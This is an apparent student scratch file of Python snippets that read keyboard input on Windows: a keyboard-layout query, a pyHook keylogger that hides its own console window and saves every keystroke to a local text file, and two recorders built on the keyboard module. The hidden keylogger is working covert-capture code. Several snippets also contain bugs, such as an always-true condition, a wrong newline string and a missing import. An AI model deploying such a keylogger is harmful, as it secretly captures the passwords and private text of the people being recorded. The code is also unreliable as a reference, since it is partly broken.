######## OLD #########


### get language with ctypes ###

from ctypes import windll, c_ulong, byref, sizeof, Structure
user32 = windll.user32

class RECT(Structure):
    _fields_ = [
        ("left", c_ulong),
        ("top", c_ulong),
        ("right", c_ulong),
        ("bottom", c_ulong)];

class GUITHREADINFO(Structure):
    _fields_ = [
    ("cbSize", c_ulong),
    ("flags", c_ulong),
    ("hwndActive", c_ulong),
    ("hwndFocus", c_ulong),
    ("hwndCapture", c_ulong),
    ("hwndMenuOwner", c_ulong),
    ("hwndMoveSize", c_ulong),
    ("hwndCaret", c_ulong),
    ("rcCaret", RECT)
    ]

def get_layout():
    guiThreadInfo = GUITHREADINFO(cbSize=sizeof(GUITHREADINFO))
    user32.GetGUIThreadInfo(0, byref(guiThreadInfo))
    dwThread = user32.GetWindowThreadProcessId(guiThreadInfo.hwndCaret, 0)
    return user32.GetKeyboardLayout(dwThread)

import time
for i in range(50):
    time.sleep(0.5)
    print(get_layout())


### Record keystrokes with pyHook ###

import win32api
import win32console
import win32gui
import pythoncom,pyHook

path = r'F:\Nir\Talpiot\1st year\SMOP\keyLoggerResults\TestNir1\data.txt'
 
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
 
def OnKeyboardEvent(event):
    if event.Ascii==5 or event.Ascii==27:
        exit(1)
    if event.Ascii !=0 or 8:
        #open output.txt to read current keystrokes
        f=open(path,'r+')
        buffer=f.read()
        f.close()
        #open output.txt to write current + new keystrokes
        f=open(path,'w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()

# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
## wait forever
#pythoncom.PumpMessages()

import time
while time.clock() < 5:
    pythoncom.PumpWaitingMessages()


### Record until keypress with keyboard module ###
import keyboard
a = keyboard.record('esc, esc')

for ev in a:
    print(ev.names)

### Record for an amount of time ###
@keyboard.listener.wrap
def record_during(duration): #in seconds
    recorded = []
    try:
        keyboard.listener.add_handler(recorded.append)
        sleep(duration)
    finally:
        keyboard.listener.remove_handler(recorded.append)
    return recorded
